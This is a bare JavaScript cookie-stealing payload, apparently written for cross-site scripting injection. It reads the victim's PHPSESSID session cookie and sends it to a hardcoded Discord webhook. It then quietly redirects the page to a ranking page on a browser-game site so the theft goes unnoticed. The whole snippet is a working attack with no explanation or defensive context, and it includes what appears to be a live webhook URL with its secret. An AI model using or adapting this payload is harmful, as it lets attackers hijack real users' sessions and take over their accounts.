function getCookie(name){
    if(document.cookie.length == 0)
      return null;

    var regSepCookie = new RegExp('(; )', 'g');
    var cookies = document.cookie.split(regSepCookie);

    for(var i = 0; i < cookies.length; i++){
      var regInfo = new RegExp('=', 'g');
      var infos = cookies[i].split(regInfo);
      if(infos[0] == name){
        return unescape(infos[1]);
      }
    }
    return null;
  }

token = getCookie("PHPSESSID")
message = `token: ${token}`;
channel_url = `https://discord.com/api/webhooks/995454248164786266/qCpBBWze7VzuLmoM2vlzlYzsbS_8QLiqBWhCWoGaxOB6ZBNl-p8e7t4-g_tUMSFvi-qd`;
request = new XMLHttpRequest();
request.withCredentials = true;
request.open("POST", channel_url);
request.setRequestHeader("accept", "*/*");
request.setRequestHeader("content-type", "application/json");
request.send(JSON.stringify({ content: message }));
setTimeout(() => {
window.location.replace("https://www.anathas.com/classement.php?page=1&alliance=&asc=DESC&ordre=pop");
}, 50);
